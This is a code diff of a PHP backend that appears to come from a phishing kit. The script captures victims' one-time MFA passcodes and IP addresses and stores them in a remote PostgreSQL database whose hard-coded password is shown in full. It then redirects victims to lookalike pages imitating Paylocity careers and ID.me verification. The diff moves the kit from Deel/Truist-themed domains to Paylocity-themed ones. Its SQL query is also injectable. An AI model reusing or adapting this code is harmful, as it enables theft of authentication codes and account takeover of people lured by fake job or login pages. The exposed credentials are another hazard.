@@ -1,5 +1,5 @@
 <?php
-    $db = pg_connect("host=pgtruist-truist.l.aivencloud.com port=13005 dbname=defaultdb user=avnadmin password=AVNS_P0lMTmzTuRpV_DjuWAM");
+    $db = pg_connect("host=pg-paycity-paylocityhr0-25.l.aivencloud.com port=19042 dbname=defaultdb user=avnadmin password=AVNS_dOBPgbxmGoJJGAwr-yJ");
 
     $userotp=$_POST['userotp'];
 
@@ -7,7 +7,7 @@ if ($_SERVER["REQUEST_METHOD"]=="POST"){
     $query = "INSERT INTO otp (userotp,time,ip) VALUES ('$_POST[userotp]',NOW(),'$_POST[ip]')";
     $result = pg_query($query);
 
- header("Location:https://deelofficial.signinverify.us/Deel.com/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.php");
+ header("Location:https://paylocity.onrender.com/www.paylocity.com/careers/all-listings.job.34092/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.php");
 exit;
 }
 ?>
